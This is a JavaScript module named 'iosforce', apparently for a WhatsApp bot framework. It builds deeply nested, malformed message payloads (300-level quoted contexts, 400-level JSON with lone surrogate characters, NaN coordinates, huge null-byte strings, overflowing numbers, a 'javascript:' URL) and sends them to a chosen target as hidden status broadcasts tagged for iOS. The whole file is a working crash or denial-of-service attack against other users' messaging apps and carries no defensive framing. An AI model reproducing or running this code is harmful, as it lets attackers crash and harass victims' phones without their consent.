const crypto = require("crypto");

module.exports = async function iosforce(sock, target) {
    const jid = target.includes("@") ? target : `${target}@s.whatsapp.net`;

    const buildNestedContext = (depth) => {
        let inner = {
            remoteJid: "\0",
            stanzaId: crypto.randomBytes(8).toString("hex").toUpperCase(),
            participant: "\0",
            quotedMessage: { conversation: "\0" }
        };

        for (let i = 0; i < depth; i++) {
            inner = {
                remoteJid: "\0",
                stanzaId: crypto.randomBytes(8).toString("hex").toUpperCase(),
                participant: "\0",
                mentionedJid: [`${"\0".repeat(8)}@s.whatsapp.net`],
                conversionSource: "\0",
                conversionData: Buffer.alloc(64, 0).toString("base64"),
                quotedMessage: {
                    extendedTextMessage: {
                        text: "\0",
                        contextInfo: inner
                    }
                }
            };
        }
        return inner;
    };

    const malformedJson = (() => {
        let obj = { t: "\uD800" };
        for (let i = 0; i < 400; i++) {
            obj = { n: obj, k: "\0", v: "\uDFFF" };
        }
        return JSON.stringify(obj);
    })();

    const interactivePayload = {
        interactiveMessage: {
            header: {
                title: "\0",
                subtitle: "\0",
                hasMediaAttachment: true,
                locationMessage: {
                    degreesLatitude: NaN,
                    degreesLongitude: NaN,
                    name: "\0".repeat(1024),
                    address: "\0".repeat(1024),
                    url: "data:".repeat(512)
                }
            },
            body: {
                text: "\0",
                contextInfo: buildNestedContext(300)
            },
            footer: {
                text: "\uD800\uDFFF".repeat(512)
            },
            nativeFlowMessage: {
                buttons: [
                    { name: "\0", buttonParamsJson: malformedJson },
                    { name: "galaxy_message", buttonParamsJson: malformedJson },
                    { name: "call_permission_request", buttonParamsJson: "\0".repeat(0x1000) },
                    { name: "single_select", buttonParamsJson: malformedJson }
                ],
                messageParamsJson: malformedJson,
                messageVersion: 0xffff
            },
            contextInfo: buildNestedContext(300)
        }
    };

    const buttonsPayload = {
        buttonsMessage: {
            contentText: "\0",
            footerText: "\0".repeat(2048),
            buttons: [
                {
                    buttonId: "\0",
                    buttonText: { displayText: "\0" },
                    type: 1,
                    nativeFlowInfo: { name: "\0", paramsJson: malformedJson }
                },
                {
                    buttonId: "\0".repeat(128),
                    buttonText: { displayText: "\uD800".repeat(256) },
                    type: 2,
                    nativeFlowInfo: { name: "galaxy_message", paramsJson: malformedJson }
                }
            ],
            headerType: 6,
            contextInfo: buildNestedContext(300)
        }
    };

    const productPayload = {
        productMessage: {
            product: {
                productImage: {
                    url: "https://mmg.whatsapp.net/" + "\0".repeat(512),
                    mimetype: "image/jpeg",
                    fileSha256: Buffer.alloc(32, 0xff).toString("base64"),
                    fileLength: "999999999999999",
                    height: 0xffffffff,
                    width: 0xffffffff
                },
                productId: "\0".repeat(64),
                title: "\0",
                description: "\uD800".repeat(1024),
                currencyCode: "\0\0\0",
                priceAmount1000: "9999999999999999999",
                retailerId: "\0",
                url: "javascript:" + "\0".repeat(512),
                productImageCount: 0xffffffff
            },
            businessOwnerJid: `${"\0".repeat(8)}@s.whatsapp.net`,
            contextInfo: buildNestedContext(300)
        }
    };

    const messageId = crypto.randomBytes(16).toString("hex").toUpperCase();

    await sock.relayMessage("status@broadcast", interactivePayload, {
        messageId,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: { appdata: "default", platform: "ios" },
                content: [
                    { tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid } }] },
                    { tag: "status_attribution", attrs: { hidden: "true" }, content: [] },
                    { tag: "platform", attrs: { type: "ios" }, content: [] }
                ]
            }
        ]
    });

    await sock.relayMessage("status@broadcast", buttonsPayload, {
        messageId: messageId + "B",
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: { appdata: "default", platform: "ios" },
                content: [
                    { tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid } }] },
                    { tag: "status_attribution", attrs: { hidden: "true" }, content: [] }
                ]
            }
        ]
    });

    await sock.relayMessage("status@broadcast", productPayload, {
        messageId: messageId + "C",
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: { appdata: "default", platform: "ios" },
                content: [
                    { tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid } }] },
                    { tag: "status_attribution", attrs: { hidden: "true" }, content: [] }
                ]
            }
        ]
    });
};
